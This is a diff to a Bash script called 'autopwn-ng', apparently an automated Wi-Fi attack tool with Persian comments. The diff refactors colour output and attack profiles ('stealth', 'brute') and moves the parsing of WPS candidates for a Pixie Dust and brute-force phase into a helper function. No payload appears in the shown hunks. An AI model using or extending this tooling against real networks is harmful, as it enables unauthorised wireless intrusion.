@@ -27,11 +27,16 @@ WLIMIT=3
 CHECKPOINT="/tmp/autopwn-ng.checkpoint"
 WORK=""
 
-c(){ printf '\033[1;36m[*]\033[0m %s\n' "$*"; }
-ok(){ printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
-warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
-err(){ printf '\033[1;31m[-]\033[0m %s\n' "$*"; }
-hr(){ printf '\033[1;35m%s\033[0m\n' "────────────────────────────────────────────"; }
+if [[ -t 1 ]]; then
+  _c=$'\033[1;36m' _ok=$'\033[1;32m' _warn=$'\033[1;33m' _err=$'\033[1;31m' _hr=$'\033[1;35m' _rst=$'\033[0m'
+else
+  _c='' _ok='' _warn='' _err='' _hr='' _rst=''
+fi
+c(){ printf '%s[*]%s %s\n' "$_c" "$_rst" "$*"; }
+ok(){ printf '%s[+]%s %s\n' "$_ok" "$_rst" "$*"; }
+warn(){ printf '%s[!]%s %s\n' "$_warn" "$_rst" "$*"; }
+err(){ printf '%s[-]%s %s\n' "$_err" "$_rst" "$*"; }
+hr(){ printf '%s%s%s\n' "$_hr" "────────────────────────────────────────────" "$_rst"; }
 
 while [ $# -gt 0 ]; do
   case "$1" in
@@ -54,12 +59,11 @@ while [ $# -gt 0 ]; do
 done
 
 case "$PROFILE" in
-  normal) ;;  # defaults already set
   stealth)
-    if [[ "$CAPTURE_EXPLICIT" -eq 0 ]]; then CAPTURE=240; fi
+    (( CAPTURE_EXPLICIT == 0 )) && CAPTURE=240
     WLIMIT=1;;
   brute)
-    if [[ "$CAPTURE_EXPLICIT" -eq 0 ]]; then CAPTURE=420; fi
+    (( CAPTURE_EXPLICIT == 0 )) && CAPTURE=420
     WLIMIT=3;;
 esac
 
@@ -436,6 +440,10 @@ fi
 if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; then
   hr; c "فاز ۴ — WPS (Pixie Dust + Brute)"
   # wash: اسکن دقیق WPS-enabled APها (بهتر از parsing CSV)
+  parse_wps_csv() {
+    awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x); c=$4; gsub(/ /,"",c); print x, c}' \
+      "$WORK/scan-01.csv" | sort -u
+  }
   if command -v wash >/dev/null; then
     wash -i "$MON" -o "$WORK/wps-scan.txt" 2>/dev/null &
     WASH_PID=$!
@@ -444,12 +452,10 @@ if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; th
     if [ -s "$WORK/wps-scan.txt" ]; then
       awk '{print $1, $6}' "$WORK/wps-scan.txt" | sort -u > "$WORK/wps-cands.txt"
     else
-      awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x); c=$4; gsub(/ /,"",c); print x, c}' \
-        "$WORK/scan-01.csv" | sort -u > "$WORK/wps-cands.txt"
+      parse_wps_csv > "$WORK/wps-cands.txt"
     fi
   else
-    awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x); c=$4; gsub(/ /,"",c); print x, c}' \
-      "$WORK/scan-01.csv" | sort -u > "$WORK/wps-cands.txt"
+    parse_wps_csv > "$WORK/wps-cands.txt"
   fi
   while read -r b ch; do
     grep -q "$b" "$WORK/cracked.txt" 2>/dev/null && continue
